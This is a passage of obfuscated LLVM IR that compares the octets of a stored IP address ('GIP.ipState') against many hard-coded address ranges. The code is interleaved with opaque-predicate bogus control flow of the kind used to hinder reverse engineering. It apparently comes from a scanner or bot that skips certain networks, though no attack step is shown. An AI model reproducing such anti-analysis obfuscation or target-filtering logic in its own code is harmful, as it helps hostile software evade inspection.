; <label>:1874:                                   ; preds = %1870, %originalBBpart2260, %originalBBpart2256
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp eq i32 %1876, 160
  br i1 %1877, label %1878, label %1886

; <label>:1878:                                   ; preds = %1874
  %1879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1880 = zext i8 %1879 to i32
  %1881 = icmp sge i32 %1880, 132
  br i1 %1881, label %1882, label %1886

; <label>:1882:                                   ; preds = %1878
  %1883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1884 = zext i8 %1883 to i32
  %1885 = icmp slt i32 %1884, 151
  br i1 %1885, label %5042, label %1886

; <label>:1886:                                   ; preds = %1882, %1878, %1874
  %1887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1888 = zext i8 %1887 to i32
  %1889 = icmp eq i32 %1888, 64
  br i1 %1889, label %1890, label %1914

; <label>:1890:                                   ; preds = %1886
  %1891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1892 = zext i8 %1891 to i32
  %1893 = icmp sge i32 %1892, 224
  br i1 %1893, label %1894, label %1914

; <label>:1894:                                   ; preds = %1890
  %1895 = load i32, i32* @x.71
  %1896 = load i32, i32* @y.72
  %1897 = sub i32 %1895, 1
  %1898 = mul i32 %1895, %1897
  %1899 = urem i32 %1898, 2
  %1900 = icmp eq i32 %1899, 0
  %1901 = icmp slt i32 %1896, 10
  %1902 = or i1 %1900, %1901
  br i1 %1902, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %1894
  %1903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1904 = zext i8 %1903 to i32
  %1905 = icmp slt i32 %1904, 227
  %1906 = load i32, i32* @x.71
  %1907 = load i32, i32* @y.72
  %1908 = sub i32 %1906, 1
  %1909 = mul i32 %1906, %1908
  %1910 = urem i32 %1909, 2
  %1911 = icmp eq i32 %1910, 0
  %1912 = icmp slt i32 %1907, 10
  %1913 = or i1 %1911, %1912
  br i1 %1913, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br i1 %1905, label %5042, label %1914

; <label>:1914:                                   ; preds = %originalBBpart2264, %1890, %1886
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp eq i32 %1916, 162
  br i1 %1917, label %1918, label %1926

; <label>:1918:                                   ; preds = %1914
  %1919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1920 = zext i8 %1919 to i32
  %1921 = icmp sge i32 %1920, 45
  br i1 %1921, label %1922, label %1926

; <label>:1922:                                   ; preds = %1918
  %1923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1924 = zext i8 %1923 to i32
  %1925 = icmp slt i32 %1924, 47
  br i1 %1925, label %5042, label %1926

; <label>:1926:                                   ; preds = %1922, %1918, %1914
  %1927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1928 = zext i8 %1927 to i32
  %1929 = icmp eq i32 %1928, 163
  br i1 %1929, label %1930, label %1938

; <label>:1930:                                   ; preds = %1926
  %1931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1932 = zext i8 %1931 to i32
  %1933 = icmp sge i32 %1932, 205
  br i1 %1933, label %1934, label %1938

; <label>:1934:                                   ; preds = %1930
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp slt i32 %1936, 207
  br i1 %1937, label %5042, label %1938

; <label>:1938:                                   ; preds = %1934, %1930, %1926
  %1939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1940 = zext i8 %1939 to i32
  %1941 = icmp eq i32 %1940, 164
  br i1 %1941, label %1942, label %1966

; <label>:1942:                                   ; preds = %1938
  %1943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1944 = zext i8 %1943 to i32
  %1945 = icmp sge i32 %1944, 45
  br i1 %1945, label %1946, label %1966

; <label>:1946:                                   ; preds = %1942
  %1947 = load i32, i32* @x.71
  %1948 = load i32, i32* @y.72
  %1949 = sub i32 %1947, 1
  %1950 = mul i32 %1947, %1949
  %1951 = urem i32 %1950, 2
  %1952 = icmp eq i32 %1951, 0
  %1953 = icmp slt i32 %1948, 10
  %1954 = or i1 %1952, %1953
  br i1 %1954, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %1946
  %1955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = icmp slt i32 %1956, 50
  %1958 = load i32, i32* @x.71
  %1959 = load i32, i32* @y.72
  %1960 = sub i32 %1958, 1
  %1961 = mul i32 %1958, %1960
  %1962 = urem i32 %1961, 2
  %1963 = icmp eq i32 %1962, 0
  %1964 = icmp slt i32 %1959, 10
  %1965 = or i1 %1963, %1964
  br i1 %1965, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br i1 %1957, label %5042, label %1966

; <label>:1966:                                   ; preds = %originalBBpart2268, %1942, %1938
  %1967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1968 = zext i8 %1967 to i32
  %1969 = icmp eq i32 %1968, 164
  br i1 %1969, label %1970, label %1994

; <label>:1970:                                   ; preds = %1966
  %1971 = load i32, i32* @x.71
  %1972 = load i32, i32* @y.72
  %1973 = sub i32 %1971, 1
  %1974 = mul i32 %1971, %1973
  %1975 = urem i32 %1974, 2
  %1976 = icmp eq i32 %1975, 0
  %1977 = icmp slt i32 %1972, 10
  %1978 = or i1 %1976, %1977
  br i1 %1978, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %1970
  %1979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp sge i32 %1980, 217
  %1982 = load i32, i32* @x.71
  %1983 = load i32, i32* @y.72
  %1984 = sub i32 %1982, 1
  %1985 = mul i32 %1982, %1984
  %1986 = urem i32 %1985, 2
  %1987 = icmp eq i32 %1986, 0
  %1988 = icmp slt i32 %1983, 10
  %1989 = or i1 %1987, %1988
  br i1 %1989, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %1981, label %1990, label %1994

; <label>:1990:                                   ; preds = %originalBBpart2272
  %1991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1992 = zext i8 %1991 to i32
  %1993 = icmp slt i32 %1992, 233
  br i1 %1993, label %5042, label %1994

; <label>:1994:                                   ; preds = %1990, %originalBBpart2272, %1966
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp eq i32 %1996, 169
  br i1 %1997, label %1998, label %2006

; <label>:1998:                                   ; preds = %1994
  %1999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2000 = zext i8 %1999 to i32
  %2001 = icmp sge i32 %2000, 252
  br i1 %2001, label %2002, label %2006

; <label>:2002:                                   ; preds = %1998
  %2003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2004 = zext i8 %2003 to i32
  %2005 = icmp slt i32 %2004, 254
  br i1 %2005, label %5042, label %2006

; <label>:2006:                                   ; preds = %2002, %1998, %1994
  %2007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2008 = zext i8 %2007 to i32
  %2009 = icmp eq i32 %2008, 199
  br i1 %2009, label %2010, label %2034

; <label>:2010:                                   ; preds = %2006
  %2011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2012 = zext i8 %2011 to i32
  %2013 = icmp sge i32 %2012, 121
  br i1 %2013, label %2014, label %2034

; <label>:2014:                                   ; preds = %2010
  %2015 = load i32, i32* @x.71
  %2016 = load i32, i32* @y.72
  %2017 = sub i32 %2015, 1
  %2018 = mul i32 %2015, %2017
  %2019 = urem i32 %2018, 2
  %2020 = icmp eq i32 %2019, 0
  %2021 = icmp slt i32 %2016, 10
  %2022 = or i1 %2020, %2021
  br i1 %2022, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %2014
  %2023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2024 = zext i8 %2023 to i32
  %2025 = icmp slt i32 %2024, 254
  %2026 = load i32, i32* @x.71
  %2027 = load i32, i32* @y.72
  %2028 = sub i32 %2026, 1
  %2029 = mul i32 %2026, %2028
  %2030 = urem i32 %2029, 2
  %2031 = icmp eq i32 %2030, 0
  %2032 = icmp slt i32 %2027, 10
  %2033 = or i1 %2031, %2032
  br i1 %2033, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %2025, label %5042, label %2034

; <label>:2034:                                   ; preds = %originalBBpart2276, %2010, %2006
  %2035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 205
  br i1 %2037, label %2038, label %2062

; <label>:2038:                                   ; preds = %2034
  %2039 = load i32, i32* @x.71
  %2040 = load i32, i32* @y.72
  %2041 = sub i32 %2039, 1
  %2042 = mul i32 %2039, %2041
  %2043 = urem i32 %2042, 2
  %2044 = icmp eq i32 %2043, 0
  %2045 = icmp slt i32 %2040, 10
  %2046 = or i1 %2044, %2045
  br i1 %2046, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2038
  %2047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2048 = zext i8 %2047 to i32
  %2049 = icmp sge i32 %2048, 1
  %2050 = load i32, i32* @x.71
  %2051 = load i32, i32* @y.72
  %2052 = sub i32 %2050, 1
  %2053 = mul i32 %2050, %2052
  %2054 = urem i32 %2053, 2
  %2055 = icmp eq i32 %2054, 0
  %2056 = icmp slt i32 %2051, 10
  %2057 = or i1 %2055, %2056
  br i1 %2057, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %2049, label %2058, label %2062

; <label>:2058:                                   ; preds = %originalBBpart2280
  %2059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp slt i32 %2060, 118
  br i1 %2061, label %5042, label %2062

; <label>:2062:                                   ; preds = %2058, %originalBBpart2280, %2034
  %2063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2064 = zext i8 %2063 to i32
  %2065 = icmp eq i32 %2064, 207
  br i1 %2065, label %2066, label %2074

; <label>:2066:                                   ; preds = %2062
  %2067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2068 = zext i8 %2067 to i32
  %2069 = icmp sge i32 %2068, 60
  br i1 %2069, label %2070, label %2074

; <label>:2070:                                   ; preds = %2066
  %2071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2072 = zext i8 %2071 to i32
  %2073 = icmp slt i32 %2072, 62
  br i1 %2073, label %5042, label %2074

; <label>:2074:                                   ; preds = %2070, %2066, %2062
  %2075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2076 = zext i8 %2075 to i32
  %2077 = icmp eq i32 %2076, 104
  br i1 %2077, label %2078, label %2086

; <label>:2078:                                   ; preds = %2074
  %2079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2080 = zext i8 %2079 to i32
  %2081 = icmp sge i32 %2080, 16
  br i1 %2081, label %2082, label %2086

; <label>:2082:                                   ; preds = %2078
  %2083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2084 = zext i8 %2083 to i32
  %2085 = icmp slt i32 %2084, 31
  br i1 %2085, label %5042, label %2086

; <label>:2086:                                   ; preds = %2082, %2078, %2074
  %2087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2088 = zext i8 %2087 to i32
  %2089 = icmp eq i32 %2088, 188
  br i1 %2089, label %2090, label %2094

; <label>:2090:                                   ; preds = %2086
  %2091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = icmp eq i32 %2092, 166
  br i1 %2093, label %5042, label %2094

; <label>:2094:                                   ; preds = %2090, %2086
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp eq i32 %2096, 188
  br i1 %2097, label %2098, label %2102

; <label>:2098:                                   ; preds = %2094
  %2099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp eq i32 %2100, 226
  br i1 %2101, label %5042, label %2102

; <label>:2102:                                   ; preds = %2098, %2094
  %2103 = load i32, i32* @x.71
  %2104 = load i32, i32* @y.72
  %2105 = sub i32 %2103, 1
  %2106 = mul i32 %2103, %2105
  %2107 = urem i32 %2106, 2
  %2108 = icmp eq i32 %2107, 0
  %2109 = icmp slt i32 %2104, 10
  %2110 = or i1 %2108, %2109
  br i1 %2110, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2102
  %2111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2112 = zext i8 %2111 to i32
  %2113 = icmp eq i32 %2112, 159
  %2114 = load i32, i32* @x.71
  %2115 = load i32, i32* @y.72
  %2116 = sub i32 %2114, 1
  %2117 = mul i32 %2114, %2116
  %2118 = urem i32 %2117, 2
  %2119 = icmp eq i32 %2118, 0
  %2120 = icmp slt i32 %2115, 10
  %2121 = or i1 %2119, %2120
  br i1 %2121, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2113, label %2122, label %2126

; <label>:2122:                                   ; preds = %originalBBpart2284
  %2123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2124 = zext i8 %2123 to i32
  %2125 = icmp eq i32 %2124, 203
  br i1 %2125, label %5042, label %2126

; <label>:2126:                                   ; preds = %2122, %originalBBpart2284
  %2127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2128 = zext i8 %2127 to i32
  %2129 = icmp eq i32 %2128, 162
  br i1 %2129, label %2130, label %2134

; <label>:2130:                                   ; preds = %2126
  %2131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2132 = zext i8 %2131 to i32
  %2133 = icmp eq i32 %2132, 243
  br i1 %2133, label %5042, label %2134

; <label>:2134:                                   ; preds = %2130, %2126
  %2135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2136 = zext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 45
  br i1 %2137, label %2138, label %2158

; <label>:2138:                                   ; preds = %2134
  %2139 = load i32, i32* @x.71
  %2140 = load i32, i32* @y.72
  %2141 = sub i32 %2139, 1
  %2142 = mul i32 %2139, %2141
  %2143 = urem i32 %2142, 2
  %2144 = icmp eq i32 %2143, 0
  %2145 = icmp slt i32 %2140, 10
  %2146 = or i1 %2144, %2145
  br i1 %2146, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2138
  %2147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2148 = zext i8 %2147 to i32
  %2149 = icmp eq i32 %2148, 55
  %2150 = load i32, i32* @x.71
  %2151 = load i32, i32* @y.72
  %2152 = sub i32 %2150, 1
  %2153 = mul i32 %2150, %2152
  %2154 = urem i32 %2153, 2
  %2155 = icmp eq i32 %2154, 0
  %2156 = icmp slt i32 %2151, 10
  %2157 = or i1 %2155, %2156
  br i1 %2157, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %2149, label %5042, label %2158

; <label>:2158:                                   ; preds = %originalBBpart2288, %2134
  %2159 = load i32, i32* @x.71
  %2160 = load i32, i32* @y.72
  %2161 = sub i32 %2159, 1
  %2162 = mul i32 %2159, %2161
  %2163 = urem i32 %2162, 2
  %2164 = icmp eq i32 %2163, 0
  %2165 = icmp slt i32 %2160, 10
  %2166 = or i1 %2164, %2165
  br i1 %2166, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2158
  %2167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2168 = zext i8 %2167 to i32
  %2169 = icmp eq i32 %2168, 178
  %2170 = load i32, i32* @x.71
  %2171 = load i32, i32* @y.72
  %2172 = sub i32 %2170, 1
  %2173 = mul i32 %2170, %2172
  %2174 = urem i32 %2173, 2
  %2175 = icmp eq i32 %2174, 0
  %2176 = icmp slt i32 %2171, 10
  %2177 = or i1 %2175, %2176
  br i1 %2177, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br i1 %2169, label %2178, label %2182

; <label>:2178:                                   ; preds = %originalBBpart2292
  %2179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2180 = zext i8 %2179 to i32
  %2181 = icmp eq i32 %2180, 62
  br i1 %2181, label %5042, label %2182

; <label>:2182:                                   ; preds = %2178, %originalBBpart2292
  %2183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2184 = zext i8 %2183 to i32
  %2185 = icmp eq i32 %2184, 104
  br i1 %2185, label %2186, label %2190

; <label>:2186:                                   ; preds = %2182
  %2187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2188 = zext i8 %2187 to i32
  %2189 = icmp eq i32 %2188, 131
  br i1 %2189, label %5042, label %2190

; <label>:2190:                                   ; preds = %2186, %2182
  %2191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2192 = zext i8 %2191 to i32
  %2193 = icmp eq i32 %2192, 104
  br i1 %2193, label %2194, label %2198

; <label>:2194:                                   ; preds = %2190
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp eq i32 %2196, 236
  br i1 %2197, label %5042, label %2198

; <label>:2198:                                   ; preds = %2194, %2190
  %2199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2200 = zext i8 %2199 to i32
  %2201 = icmp eq i32 %2200, 107
  br i1 %2201, label %2202, label %2222

; <label>:2202:                                   ; preds = %2198
  %2203 = load i32, i32* @x.71
  %2204 = load i32, i32* @y.72
  %2205 = sub i32 %2203, 1
  %2206 = mul i32 %2203, %2205
  %2207 = urem i32 %2206, 2
  %2208 = icmp eq i32 %2207, 0
  %2209 = icmp slt i32 %2204, 10
  %2210 = or i1 %2208, %2209
  br i1 %2210, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2202
  %2211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2212 = zext i8 %2211 to i32
  %2213 = icmp eq i32 %2212, 170
  %2214 = load i32, i32* @x.71
  %2215 = load i32, i32* @y.72
  %2216 = sub i32 %2214, 1
  %2217 = mul i32 %2214, %2216
  %2218 = urem i32 %2217, 2
  %2219 = icmp eq i32 %2218, 0
  %2220 = icmp slt i32 %2215, 10
  %2221 = or i1 %2219, %2220
  br i1 %2221, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %2213, label %5042, label %2222

; <label>:2222:                                   ; preds = %originalBBpart2296, %2198
  %2223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2224 = zext i8 %2223 to i32
  %2225 = icmp eq i32 %2224, 138
  br i1 %2225, label %2226, label %2246

; <label>:2226:                                   ; preds = %2222
  %2227 = load i32, i32* @x.71
  %2228 = load i32, i32* @y.72
  %2229 = sub i32 %2227, 1
  %2230 = mul i32 %2227, %2229
  %2231 = urem i32 %2230, 2
  %2232 = icmp eq i32 %2231, 0
  %2233 = icmp slt i32 %2228, 10
  %2234 = or i1 %2232, %2233
  br i1 %2234, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %2226
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 197
  %2238 = load i32, i32* @x.71
  %2239 = load i32, i32* @y.72
  %2240 = sub i32 %2238, 1
  %2241 = mul i32 %2238, %2240
  %2242 = urem i32 %2241, 2
  %2243 = icmp eq i32 %2242, 0
  %2244 = icmp slt i32 %2239, 10
  %2245 = or i1 %2243, %2244
  br i1 %2245, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2237, label %5042, label %2246

; <label>:2246:                                   ; preds = %originalBBpart2300, %2222
  %2247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2248 = zext i8 %2247 to i32
  %2249 = icmp eq i32 %2248, 138
  br i1 %2249, label %2250, label %2254

; <label>:2250:                                   ; preds = %2246
  %2251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2252 = zext i8 %2251 to i32
  %2253 = icmp eq i32 %2252, 68
  br i1 %2253, label %5042, label %2254

; <label>:2254:                                   ; preds = %2250, %2246
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 139
  br i1 %2257, label %2258, label %2278

; <label>:2258:                                   ; preds = %2254
  %2259 = load i32, i32* @x.71
  %2260 = load i32, i32* @y.72
  %2261 = sub i32 %2259, 1
  %2262 = mul i32 %2259, %2261
  %2263 = urem i32 %2262, 2
  %2264 = icmp eq i32 %2263, 0
  %2265 = icmp slt i32 %2260, 10
  %2266 = or i1 %2264, %2265
  br i1 %2266, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2258
  %2267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2268 = zext i8 %2267 to i32
  %2269 = icmp eq i32 %2268, 59
  %2270 = load i32, i32* @x.71
  %2271 = load i32, i32* @y.72
  %2272 = sub i32 %2270, 1
  %2273 = mul i32 %2270, %2272
  %2274 = urem i32 %2273, 2
  %2275 = icmp eq i32 %2274, 0
  %2276 = icmp slt i32 %2271, 10
  %2277 = or i1 %2275, %2276
  br i1 %2277, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br i1 %2269, label %5042, label %2278

; <label>:2278:                                   ; preds = %originalBBpart2304, %2254
  %2279 = load i32, i32* @x.71
  %2280 = load i32, i32* @y.72
  %2281 = sub i32 %2279, 1
  %2282 = mul i32 %2279, %2281
  %2283 = urem i32 %2282, 2
  %2284 = icmp eq i32 %2283, 0
  %2285 = icmp slt i32 %2280, 10
  %2286 = or i1 %2284, %2285
  br i1 %2286, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2278
  %2287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2288 = zext i8 %2287 to i32
  %2289 = icmp eq i32 %2288, 146
  %2290 = load i32, i32* @x.71
  %2291 = load i32, i32* @y.72
  %2292 = sub i32 %2290, 1
  %2293 = mul i32 %2290, %2292
  %2294 = urem i32 %2293, 2
  %2295 = icmp eq i32 %2294, 0
  %2296 = icmp slt i32 %2291, 10
  %2297 = or i1 %2295, %2296
  br i1 %2297, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br i1 %2289, label %2298, label %2326

; <label>:2298:                                   ; preds = %originalBBpart2308
  %2299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2300 = zext i8 %2299 to i32
  %2301 = icmp eq i32 %2300, 185
  br i1 %2301, label %2302, label %2326

; <label>:2302:                                   ; preds = %2298
  %2303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2304 = zext i8 %2303 to i32
  %2305 = icmp sge i32 %2304, 128
  br i1 %2305, label %2306, label %2326

; <label>:2306:                                   ; preds = %2302
  %2307 = load i32, i32* @x.71
  %2308 = load i32, i32* @y.72
  %2309 = sub i32 %2307, 1
  %2310 = mul i32 %2307, %2309
  %2311 = urem i32 %2310, 2
  %2312 = icmp eq i32 %2311, 0
  %2313 = icmp slt i32 %2308, 10
  %2314 = or i1 %2312, %2313
  br i1 %2314, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2306
  %2315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2316 = zext i8 %2315 to i32
  %2317 = icmp slt i32 %2316, 191
  %2318 = load i32, i32* @x.71
  %2319 = load i32, i32* @y.72
  %2320 = sub i32 %2318, 1
  %2321 = mul i32 %2318, %2320
  %2322 = urem i32 %2321, 2
  %2323 = icmp eq i32 %2322, 0
  %2324 = icmp slt i32 %2319, 10
  %2325 = or i1 %2323, %2324
  br i1 %2325, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %2317, label %5042, label %2326

; <label>:2326:                                   ; preds = %originalBBpart2312, %2302, %2298, %originalBBpart2308
  %2327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2328 = zext i8 %2327 to i32
  %2329 = icmp eq i32 %2328, 163
  br i1 %2329, label %2330, label %2342

; <label>:2330:                                   ; preds = %2326
  %2331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2332 = zext i8 %2331 to i32
  %2333 = icmp eq i32 %2332, 47
  br i1 %2333, label %2334, label %2342

; <label>:2334:                                   ; preds = %2330
  %2335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2336 = zext i8 %2335 to i32
  %2337 = icmp sge i32 %2336, 10
  br i1 %2337, label %2338, label %2342

; <label>:2338:                                   ; preds = %2334
  %2339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2340 = zext i8 %2339 to i32
  %2341 = icmp slt i32 %2340, 11
  br i1 %2341, label %5042, label %2342

; <label>:2342:                                   ; preds = %2338, %2334, %2330, %2326
  %2343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2344 = zext i8 %2343 to i32
  %2345 = icmp eq i32 %2344, 174
  br i1 %2345, label %2346, label %2374

; <label>:2346:                                   ; preds = %2342
